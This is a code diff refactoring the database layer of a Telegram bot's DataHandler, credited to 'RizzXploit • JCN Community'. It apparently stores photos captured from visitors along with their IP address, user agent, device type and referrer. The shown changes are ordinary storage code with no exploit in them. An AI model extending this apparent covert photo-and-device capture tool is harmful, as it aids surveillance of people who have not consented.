@@ -7,9 +7,7 @@ class DataHandler {
   // View personal data
   async viewPersonalData(chatId) {
     try {
-      const userData = await Data.find({ user_id: chatId.toString() })
-        .sort({ timestamp: -1 })
-        .limit(10);
+      const userData = await Data.findByUserId(chatId.toString(), 10);
 
       if (userData.length === 0) {
         global.bot.sendMessage(chatId,
@@ -99,7 +97,7 @@ class DataHandler {
         user_id: chatId.toString() 
       });
 
-      if (result.deletedCount === 0) {
+      if (!result) {
         global.bot.sendMessage(chatId,
           `❌ Data tidak ditemukan atau tidak bisa dihapus.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
           { parse_mode: 'Markdown' }
@@ -108,10 +106,9 @@ class DataHandler {
       }
 
       // Update user stats
-      await User.findOneAndUpdate(
-        { user_id: chatId.toString() },
-        { $inc: { data_collected: -1 } }
-      );
+      await User.update(chatId.toString(), { 
+        data_collected: await Data.count({ user_id: chatId.toString() })
+      });
 
       global.bot.sendMessage(chatId,
         `✅ Data berhasil dihapus!\n\n🔧 *Bot by RizzXploit • JCN Community*`,
@@ -131,7 +128,7 @@ class DataHandler {
   async showUserStats(chatId) {
     try {
       const user = await User.findOne({ user_id: chatId.toString() });
-      const dataCount = await Data.countDocuments({ user_id: chatId.toString() });
+      const dataCount = await Data.count({ user_id: chatId.toString() });
 
       if (!user) {
         global.bot.sendMessage(chatId,
@@ -165,10 +162,10 @@ class DataHandler {
     try {
       const fileId = `photo_${clientInfo.ip}_${Date.now()}`;
       
-      const newData = new Data({
+      await Data.create({
         file_id: fileId,
         user_id: userId,
-        image_url: imageData, // URL atau base64
+        image_url: imageData,
         ip_address: clientInfo.ip,
         user_agent: clientInfo.userAgent,
         device_type: clientInfo.deviceType,
@@ -176,16 +173,12 @@ class DataHandler {
         referrer: clientInfo.referrer
       });
 
-      await newData.save();
-
       // Update user stats
-      await User.findOneAndUpdate(
-        { user_id: userId },
-        { 
-          $inc: { data_collected: 1 },
-          $set: { last_active: new Date() }
-        }
-      );
+      const dataCount = await Data.count({ user_id: userId });
+      await User.update(userId, { 
+        data_collected: dataCount,
+        last_active: new Date()
+      });
 
       return { success: true, fileId };
 
